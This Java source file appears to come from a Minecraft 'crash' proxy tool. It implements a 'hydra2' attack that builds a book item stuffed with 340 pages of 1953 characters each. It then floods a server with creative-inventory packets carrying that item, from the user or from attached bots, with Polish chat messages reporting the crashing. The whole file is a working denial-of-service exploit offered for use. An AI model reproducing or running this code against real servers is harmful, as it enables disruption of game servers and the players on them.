package net.avarioncode.proxy.system.crash.impl;

import net.avarioncode.proxy.mc.data.game.WindowAction;
import net.avarioncode.proxy.mc.data.item.ItemStack;
import net.avarioncode.proxy.mc.objects.Player;
import net.avarioncode.proxy.mc.packet.Packet;
import net.avarioncode.proxy.mc.packet.impl.client.play.ClientCreativeInventoryAction;
import net.avarioncode.proxy.mc.packet.impl.client.play.ClientPlayerWindowActionPacket;
import net.avarioncode.proxy.system.crash.Crash;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;

import java.util.List;
import java.util.concurrent.atomic.AtomicReference;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

public class CrashHydra2 extends Crash {

    private Packet packet;

    public CrashHydra2() {
        super("hydra2");
    }

    @Override
    public void init() {
        final AtomicReference<String> pageContent = new AtomicReference<>();
        pageContent.set("");

        IntStream.range(0, 1953).forEach(i -> pageContent.set(pageContent.get() + "."));

        final NBTTagCompound compound = new NBTTagCompound();

        final List<NBTBase> list = IntStream.range(0, 340)
                .mapToObj(ia -> new NBTTagString(pageContent.get()))
                .collect(Collectors.toList());

        final NBTTagList pages = new NBTTagList();
        list.forEach(pages::appendTag);

        compound.setTag("pages", pages);
        compound.setTag("title", new NBTTagString("HydraAttack"));
        compound.setTag("author", new NBTTagString("AvarionProxy"));

        final ItemStack itemStack = new ItemStack(386, 1, 0, compound);
        this.packet = new ClientPlayerWindowActionPacket(0, (short) 0, 0, WindowAction.CLICK_ITEM, 0, itemStack);
        this.packet = new ClientCreativeInventoryAction(36, itemStack);
    }

    @Override
    public void execute(String message, Player sender) {

        if (packet == null) {
            sender.sendChatMessage("&7Wystapil blad podczas wysylania pakietow!");
            return;
        }
        try {
            int time;
            int time2;
            final String[] args = message.split(" ");
            final int amount = Integer.parseInt(args[2]);
            if (sender.getBots().size() == 0) {
                time = (int) System.currentTimeMillis();
                sender.sendChatMessage("&7Rozpoczynam crashowanie &8(&fHYDRA2&8) (&fPLAYER&8)");
                IntStream.range(0, amount).forEach(i -> sender.getConnector().sendPacket(packet));
                time2 = (int) System.currentTimeMillis() - time;
                sender.sendChatMessage("&7Crashowanie zakonczone &8(&f" + time2 + "MS&8)");
            } else {
                time = (int) System.currentTimeMillis();
                sender.sendChatMessage("&7Rozpoczynam crashowanie &8(&fHYDRA2&8) (&fBOTS&8)");
                sender.getBots().forEach(b -> IntStream.range(0, amount).forEach(i -> b.getConnection().sendPacket(packet)));
                time2 = (int) System.currentTimeMillis() - time;
                sender.sendChatMessage("&7Crashowanie zakonczone &8(&f" + time2 + "MS&8)");
            }
        } catch (final Throwable t) {
            sender.sendChatMessage("&7Wystapil blad podczas crashowania! &8(&f" + t.getClass().getSimpleName() + "&8)");
        }
    }
}
